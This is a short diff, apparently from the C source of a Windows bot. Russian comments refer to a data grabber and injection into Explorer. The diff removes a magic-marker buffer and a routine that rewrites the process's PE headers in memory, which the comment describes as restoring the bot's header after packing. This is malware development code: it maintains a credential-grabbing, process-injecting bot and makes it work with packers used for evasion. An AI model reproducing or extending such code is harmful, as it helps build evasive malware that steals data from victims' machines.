@@ -78,9 +78,6 @@ DWORD dwGrabberRun	 = 0; //отработал ли граббер
 DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
-//Специальная маска-смещение, используется для восстановления заголовка бота после пакера
-#define MAGIC "\0\0\0\0MAGIC_TEST"
-char MagicValue[6144] = MAGIC;
 
 //получаем пид эксплорера
 
@@ -323,24 +320,7 @@ int APIENTRY MyMain()
 		return 0;
 	}
 
-
-	DWORD* pVirtualAddr = (DWORD*)MagicValue;
-
-	if ( *pVirtualAddr )
-	{
-		DWORD Old;
-		PCHAR ImageBase = (PCHAR)GetImageBase();
-		PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)( (PCHAR)ImageBase + *pVirtualAddr);
-		PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)( (PCHAR)pDos + pDos->e_lfanew);
-
-		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &Old );
-		m_memcpy( ImageBase, pDos, pHeaders->OptionalHeader.SizeOfHeaders );
-		pVirtualProtect( ImageBase, pHeaders->OptionalHeader.SizeOfHeaders, Old, &Old );
-	}	
-
-
 	MDBG("Main", "Запускается бот. Версия бота %s", BOT_VERSION);
-	;
 
 	#if defined(DEBUGBOT) && defined(DebugUtils)
 		if (!StartInDebugingMode(true))
